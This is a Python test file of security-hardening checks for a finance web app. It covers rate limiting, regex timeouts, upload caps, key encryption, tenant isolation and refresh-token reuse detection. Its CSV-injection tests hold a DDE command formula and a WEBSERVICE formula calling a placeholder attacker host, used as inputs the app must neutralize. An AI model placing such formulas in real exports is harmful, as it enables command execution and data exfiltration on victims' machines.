"""Security-hardening contract tests (SECURITY_REVIEW.md findings #3-#9, Low set).

Each test pins one hardening behavior from the approved plan; the rate-limit
test is the only one that touches global limiter state (opt-in + full reset).
"""

import csv
import io
import time
from decimal import Decimal

from fastapi.testclient import TestClient
from sqlmodel import Session

from app.core.config import Settings
from app.core.crypto import decrypt_secret, encrypt_secret
from app.models.llm_suggestions import LlmSuggestion
from app.models.rules import Rule, RuleMatchType
from app.services.reports import csv_safe
from app.services.reports import report_csv as services_report_csv
from app.services.rules_engine import rule_matches

REGISTER = "/api/v1/auth/register"
LOGIN = "/api/v1/auth/login"
REFRESH = "/api/v1/auth/refresh"
TRANSACTIONS = "/api/v1/transactions"

EMAIL = "hardening@example.com"
PASSWORD = "correct-horse-battery"


def _register(client: TestClient, email: str = EMAIL) -> dict:
    client.post(REGISTER, json={"email": email, "password": PASSWORD})
    response = client.post("/api/v1/auth/login", json={"email": email, "password": PASSWORD})
    assert response.status_code == 200, response.text
    return response.json()


def _headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def _make_account(client: TestClient, token: str) -> int:
    inst = client.post(
        "/api/v1/institutions",
        json={"name": "Hardening Bank", "importer_profile": PROFILE},
        headers=_headers(token),
    )
    assert inst.status_code == 201, inst.text
    account = client.post(
        "/api/v1/accounts",
        json={
            "name": "Checking",
            "type": "chequing",
            "currency": "CAD",
            "institution_id": inst.json()["id"],
        },
        headers=_headers(token),
    )
    assert account.status_code == 201, account.text
    return account.json()["id"]


PROFILE = {
    "columns": {"date": "Date", "amount_native": "Amount", "raw_description": "Description"},
    "date_format": "%Y-%m-%d",
    "credits_positive": True,
}


def _csv_bytes(rows: list[tuple[str, str]]) -> bytes:
    lines = ["Date,Amount,Description"]
    lines += [f"{date},{amount},{payee}" for date, amount, payee in rows]
    return ("\n".join(lines) + "\n").encode()


def _upload_csv(client: TestClient, token: str, account_id: int, raw: bytes) -> dict:
    response = client.post(
        "/api/v1/imports/upload",
        headers=_headers(token),
        data={"account_id": str(account_id)},
        files={"file": ("statement.csv", raw, "text/csv")},
    )
    assert response.status_code == 201, response.text
    return response.json()


def _commit_upload(client: TestClient, token: str, account_id: int, raw: bytes) -> dict:
    batch = _upload_csv(client, token, account_id, raw)
    response = client.post(f"/api/v1/imports/{batch['id']}/commit", headers=_headers(token))
    assert response.status_code == 200, response.text
    return response.json()


def _categories(client: TestClient, auth: dict) -> list[dict]:
    return client.get("/api/v1/categories", headers=_headers(auth["access_token"])).json()["items"]


# --- 1. Fail-fast secret (#3) ------------------------------------------------


def test_settings_reject_default_jwt_secret() -> None:
    try:
        Settings(jwt_secret="dev-secret-change-me")
    except Exception as exc:  # pydantic wraps ValueError in ValidationError
        assert "JWT_SECRET" in str(exc)
    else:
        raise AssertionError("default dev secret must be rejected")


def test_settings_accept_non_default_secret() -> None:
    Settings(jwt_secret="a-long-random-test-secret-0123456789abcd")  # must not raise


# --- 2. Rate limiting (#1) ---------------------------------------------------


def test_login_burst_returns_429_envelope(client: TestClient) -> None:
    from app.core.ratelimit import limiter

    _register(client)
    limiter.enabled = True
    try:
        attempts = []
        for _ in range(11):
            response = client.post(LOGIN, json={"email": EMAIL, "password": "wrong"})
            attempts.append((response.status_code, response.json()))
        assert all(status == 401 for status, _ in attempts[:10])
        last_status, last_body = attempts[-1]
        assert last_status == 429
        assert last_body == {"detail": "Too many attempts", "code": "rate_limited"}
    finally:
        limiter.enabled = False
        limiter.reset()


# --- 4. ReDoS (#4) -----------------------------------------------------------


def test_catastrophic_regex_times_out_as_non_match() -> None:
    rule = Rule(
        user_id=0,
        match_type=RuleMatchType.regex,
        pattern="(a|aa)+$",
        priority=0,
        category_id=0,
    )
    start = time.perf_counter()
    matched = rule_matches(rule, "a" * 80 + "X", Decimal(0))
    elapsed = time.perf_counter() - start
    assert matched is False
    assert elapsed < 5.0, f"regex engine did not enforce timeout ({elapsed:.2f}s)"


def test_regex_rule_still_matches_normally() -> None:
    rule = Rule(
        user_id=0,
        match_type=RuleMatchType.regex,
        pattern="grocer(y|ies)",
        priority=0,
        category_id=0,
    )
    assert rule_matches(rule, "WHOLESALE GROCERY DEPOT", Decimal(0)) is True


def test_csv_safe_neutralizes_formula_prefixes() -> None:
    for payload in ("=cmd|' /C calc'!A0", "+2+3", "-1+1", "@SUM(1)", "\tTAB"):
        assert csv_safe(payload).startswith("'")


def test_services_report_writer_neutralizes_webservice_cell() -> None:
    out = services_report_csv(
        rows=[
            {
                "security": '=WEBSERVICE("http://attacker.invalid")',
                "total_cad": Decimal("12.34"),
            }
        ],
        fields=["security", "total_cad"],
    )
    parsed = list(csv.reader(io.StringIO(out)))
    assert parsed[1][0].startswith("'=WEBSERVICE")
    assert parsed[1][1] == "12.34"  # numeric cell stays raw (no quote prefix)


def test_tax_report_writer_neutralizes_webservice_cells() -> None:
    from app.tax.reports import DISCLAIMER
    from app.tax.reports import report_csv as tax_report_csv

    report = {
        "items": [
            {
                "security": '=WEBSERVICE("http://attacker.invalid")',
                "proceeds_cad": Decimal("100.00"),
                "acb_cad": Decimal("80.00"),
                "gain_loss_cad": Decimal("20.00"),
                "outlays_commissions_cad": Decimal("0.00"),
            }
        ],
        "denials": [
            {
                "symbol": "=SUM(A1)",
                "sale_date": "2025-06-01",
                "outcome": "deferral",
                "acquiring_account_id": 7,
                "denied_loss_cad": Decimal("5.00"),
            }
        ],
        "disclaimer": DISCLAIMER,
    }
    out = tax_report_csv(report)
    item_rows = [line for line in out.splitlines() if "'=WEBSERVICE" in line]
    denial_rows = [line for line in out.splitlines() if "'=SUM(A1)" in line]
    assert len(item_rows) == 1 and len(denial_rows) == 1
    assert "added to acquiring pool ACB (account 7)" in out


# --- 6. Upload caps (#6) -----------------------------------------------------


def test_upload_over_5mb_rejected_before_parse(client: TestClient) -> None:
    auth = _register(client)
    account_id = _make_account(client, auth["access_token"])
    response = client.post(
        "/api/v1/imports/upload",
        headers=_headers(auth["access_token"]),
        data={"account_id": str(account_id)},
        files={"file": ("huge.csv", b"x" * (5_000_000 + 1), "text/csv")},
    )
    assert response.status_code == 413
    assert response.json()["code"] == "file_too_large"


def test_upload_with_over_2000_rows_rejected(client: TestClient) -> None:
    auth = _register(client, email="rows@example.com")
    account_id = _make_account(client, auth["access_token"])
    rows = [(f"2025-01-{(i % 28) + 1:02d}", "-1.00", f"Payee {i}") for i in range(2001)]
    raw = _csv_bytes(rows)
    response = client.post(
        "/api/v1/imports/upload",
        headers=_headers(auth["access_token"]),
        data={"account_id": str(account_id)},
        files={"file": ("big.csv", raw, "text/csv")},
    )
    assert response.status_code == 413
    assert response.json()["code"] == "too_many_rows"
    # Nothing was staged before rejection.
    batches = client.get("/api/v1/imports", headers=_headers(auth["access_token"]))
    assert batches.json()["total"] == 0


def test_upload_within_caps_succeeds(client: TestClient) -> None:
    auth = _register(client, email="small@example.com")
    account_id = _make_account(client, auth["access_token"])
    body = _upload_csv(
        client,
        auth["access_token"],
        account_id,
        _csv_bytes([("2025-01-01", "-1.00", "Coffee shop")]),
    )
    assert body["imported"] == 1


# --- 8. llm_api_key at rest (#8) ---------------------------------------------


def test_fernet_round_trip_and_plaintext_fallback() -> None:
    secret = "sk-live-abc123"
    stored = encrypt_secret(secret)
    assert stored != secret
    assert decrypt_secret(stored) == secret
    # Pre-encryption plaintext rows decrypt to themselves.
    assert decrypt_secret(secret) == secret


def test_patch_me_stores_key_encrypted_at_rest(client: TestClient, session: Session) -> None:
    from app.models.users import User

    auth = _register(client, email="keyed@example.com")
    patched = client.patch(
        "/api/v1/users/me",
        json={"llm_api_key": "sk-live-xyz"},
        headers=_headers(auth["access_token"]),
    )
    assert patched.status_code == 200
    row = session.get(User, auth["user"]["id"])
    session.refresh(row)
    assert row.llm_api_key != "sk-live-xyz"
    assert decrypt_secret(row.llm_api_key) == "sk-live-xyz"


def test_resolve_settings_decrypts_stored_key() -> None:
    from app.llm.base import resolve_settings
    from app.models.users import LlmProvider, User

    user = User(
        id=0,
        email="resolve@example.com",
        hashed_password="x",
        privacy_mode=False,
        llm_provider=LlmProvider.openai_compatible,
        llm_api_key=encrypt_secret("sk-resolved"),
    )
    _, _, api_key, _ = resolve_settings(user, Settings())
    assert api_key == "sk-resolved"


def test_resolve_settings_tolerates_null_stored_key() -> None:
    """Users without a stored key must fall back to env — never crash on None
    (regression: decrypt_secret(None) raised AttributeError in the pipeline)."""
    from app.llm.base import resolve_settings
    from app.models.users import LlmProvider, User

    user = User(
        id=0,
        email="resolve-null@example.com",
        hashed_password="x",
        privacy_mode=False,
        llm_provider=LlmProvider.ollama,
        llm_api_key=None,
    )
    _, _, api_key, _ = resolve_settings(user, Settings(llm_api_key="env-key"))
    assert api_key == "env-key"


# --- 9. Auth schema (#9) ------------------------------------------------------


def test_register_rejects_malformed_email_envelope(client: TestClient) -> None:
    # M87: this is a request-shape failure, so the REGISTER call itself answers
    # 422 (a validation error is not an oracle — it fires for every bad body).
    response = client.post(REGISTER, json={"email": "not-an-email", "password": PASSWORD})
    assert response.status_code == 422
    assert response.json()["code"] == "validation_error"


def test_register_rejects_73_byte_password(client: TestClient) -> None:
    response = client.post(REGISTER, json={"email": EMAIL, "password": "p" * 73})
    assert response.status_code == 422
    assert response.json() == {"detail": "Password exceeds 72 bytes", "code": "password_too_long"}


def test_register_answers_free_and_taken_addresses_identically(client: TestClient) -> None:
    """Review #9's enumeration tradeoff is RESOLVED (M87, docs/29 F15).

    The deliberate `409 duplicate_email` UX is gone: a taken address now gets
    exactly the answer a free one gets, so this asserts the closed oracle
    instead of the open one — and pins the cost the old comment chose (the
    caller learns "register accepted" either way and signs in to find out).
    """
    _register(client)
    client.cookies.clear()
    taken = client.post(REGISTER, json={"email": EMAIL, "password": "other-password"})
    assert taken.status_code == 200
    assert taken.json()["status"] == "accepted"
    assert taken.json().get("code") != "duplicate_email"
    # ...and the duplicate attempt did not mint a session for the stranger.
    assert client.cookies.get("refresh_token") is None


# --- Low: tenancy depth -------------------------------------------------------


def _make_suggestion(
    session: Session, *, user_id: int, transaction_id: int, category_id: int
) -> LlmSuggestion:
    suggestion = LlmSuggestion(
        user_id=user_id,
        transaction_id=transaction_id,
        proposed_category_id=category_id,
        confidence=0.9,
        model_used="test",
    )
    session.add(suggestion)
    session.commit()
    session.refresh(suggestion)
    return suggestion


def test_accept_foreign_target_returns_404(client: TestClient, session: Session) -> None:
    a = _register(client, email="tenanta@example.com")
    b = _register(client, email="tenantb@example.com")

    # B owns a transaction (via a real upload so FKs hold).
    b_account = _make_account(client, b["access_token"])
    _commit_upload(
        client,
        b["access_token"],
        b_account,
        _csv_bytes([("2025-02-01", "-9.00", "Foreign coffee")]),
    )

    a_category_id = next(c["id"] for c in _categories(client, a))
    foreign_txn = client.get(TRANSACTIONS, headers=_headers(b["access_token"])).json()["items"][0]

    suggestion = _make_suggestion(
        session,
        user_id=a["user"]["id"],
        transaction_id=foreign_txn["id"],  # B's transaction — NOT A's
        category_id=a_category_id,
    )
    response = client.post(
        f"/api/v1/suggestions/{suggestion.id}/accept", headers=_headers(a["access_token"])
    )
    assert response.status_code == 404
    assert response.json() == {"detail": "Suggestion target not found", "code": "not_found"}


def test_owned_suggestion_foreign_id_is_404_not_409(client: TestClient, session: Session) -> None:
    a = _register(client, email="owner-a@example.com")
    b = _register(client, email="owner-b@example.com")

    # B owns both the suggestion and its FK targets.
    b_account = _make_account(client, b["access_token"])
    _commit_upload(
        client,
        b["access_token"],
        b_account,
        _csv_bytes([("2025-02-02", "-3.00", "B payee")]),
    )
    b_txn_id = client.get(TRANSACTIONS, headers=_headers(b["access_token"])).json()["items"][0][
        "id"
    ]
    b_category_id = next(c["id"] for c in _categories(client, b))
    suggestion = _make_suggestion(
        session, user_id=b["user"]["id"], transaction_id=b_txn_id, category_id=b_category_id
    )

    accept = client.post(
        f"/api/v1/suggestions/{suggestion.id}/accept", headers=_headers(a["access_token"])
    )
    assert accept.status_code == 404
    assert accept.json() == {"detail": "Suggestion not found", "code": "not_found"}

    reject = client.post(
        f"/api/v1/suggestions/{suggestion.id}/reject", headers=_headers(a["access_token"])
    )
    assert reject.status_code == 404
    assert reject.json()["code"] == "not_found"


# --- Low: refresh reuse-detection ---------------------------------------------


def _refresh_with_cookie(client: TestClient, token: str | None):
    """Call REFRESH presenting `token` as the httpOnly cookie.

    The API is cookie-only (docs/08): a body `refresh_token` is ignored, so a
    body-based call would exercise the "no token presented" path and assert
    nothing about reuse detection. Sending the cookie keeps these tests testing
    what they were written to test.

    A THROWAWAY client is used on purpose. httpx keys cookies by (name, domain,
    path) but a manually-set cookie has no domain while the server's Set-Cookie
    has `testserver.local`, so both survive in one jar and every later
    `cookies.get` raises CookieConflict. A fresh client per call carries exactly
    the one token under test and leaves the real jar untouched.
    """
    assert token, "the auth response must set a refresh_token cookie"
    one_shot = TestClient(client.app)
    one_shot.cookies.set("refresh_token", token, path="/api/v1/auth")
    return one_shot.post(REFRESH)


def test_refresh_reuse_revokes_all_user_sessions(client: TestClient) -> None:
    # M1: auth responses deliver the refresh token cookie-only, so capture it
    # from the jar right after each call that rotates it (the jar keeps only
    # the newest, and every login below overwrites the previous cookie).
    _register(client, email="reuse@example.com")
    refresh_one = client.cookies.get("refresh_token")
    client.post(LOGIN, json={"email": "reuse@example.com", "password": PASSWORD})
    refresh_two = client.cookies.get("refresh_token")
    client.post(LOGIN, json={"email": "reuse@example.com", "password": PASSWORD})
    refresh_three = client.cookies.get("refresh_token")

    # Rotate pair one, then replay its ALREADY-REVOKED token.
    rotated = _refresh_with_cookie(client, refresh_one)
    assert rotated.status_code == 200
    rotated_refresh = client.cookies.get("refresh_token")
    replay = _refresh_with_cookie(client, refresh_one)
    assert replay.status_code == 401
    assert replay.json()["code"] == "invalid_or_revoked_refresh_token"

    # The OTHER pairs' still-fresh tokens were cascaded away by reuse detection.
    for stale in (refresh_two, refresh_three):
        response = _refresh_with_cookie(client, stale)
        assert response.status_code == 401
        assert response.json()["code"] == "invalid_or_revoked_refresh_token"

    # The rotation-issued pair was ALSO cascaded away: reuse detection revokes
    # every live session for the user, no exceptions (contract item 9).
    everything = _refresh_with_cookie(client, rotated_refresh)
    assert everything.status_code == 401
    assert everything.json()["code"] == "invalid_or_revoked_refresh_token"


def test_unknown_refresh_token_does_not_trigger_cascade(client: TestClient) -> None:
    _register(client, email="unknown@example.com")
    survivor_token = client.cookies.get("refresh_token")
    junk = _refresh_with_cookie(client, "not-a-real-token")
    assert junk.status_code == 401
    survivor = _refresh_with_cookie(client, survivor_token)
    assert survivor.status_code == 200


# --- Low: ILIKE escaping -------------------------------------------------------


def test_payee_filter_percent_matches_literally(client: TestClient) -> None:
    auth = _register(client, email="ilike@example.com")
    account_id = _make_account(client, auth["access_token"])
    _commit_upload(
        client,
        auth["access_token"],
        account_id,
        _csv_bytes(
            [
                ("2025-04-01", "-1.00", "100% profit"),
                ("2025-04-02", "-2.00", "100 percent"),
            ]
        ),
    )
    response = client.get(
        TRANSACTIONS, params={"payee": "100%"}, headers=_headers(auth["access_token"])
    )
    assert response.status_code == 200
    payees = [item["raw_description"] for item in response.json()["items"]]
    assert payees == ["100% profit"]


def test_payee_filter_underscore_matches_literally(client: TestClient) -> None:
    auth = _register(client, email="underscore@example.com")
    account_id = _make_account(client, auth["access_token"])
    _commit_upload(
        client,
        auth["access_token"],
        account_id,
        _csv_bytes(
            [
                ("2025-05-01", "-1.00", "a_b shop"),
                ("2025-05-02", "-2.00", "axb shop"),
            ]
        ),
    )
    response = client.get(
        TRANSACTIONS, params={"payee": "a_b"}, headers=_headers(auth["access_token"])
    )
    assert response.status_code == 200
    payees = [item["raw_description"] for item in response.json()["items"]]
    assert payees == ["a_b shop"]


# --- Low: imports count query --------------------------------------------------


def test_list_batches_reports_total_without_materializing(client: TestClient) -> None:
    auth = _register(client, email="batches@example.com")
    account_id = _make_account(client, auth["access_token"])
    for i in range(3):
        _upload_csv(
            client,
            auth["access_token"],
            account_id,
            _csv_bytes([("2025-01-01", f"-{i}.00", f"Batch {i}")]),
        )
    body = client.get("/api/v1/imports?limit=2", headers=_headers(auth["access_token"])).json()
    assert body["total"] == 3
    assert len(body["items"]) == 2
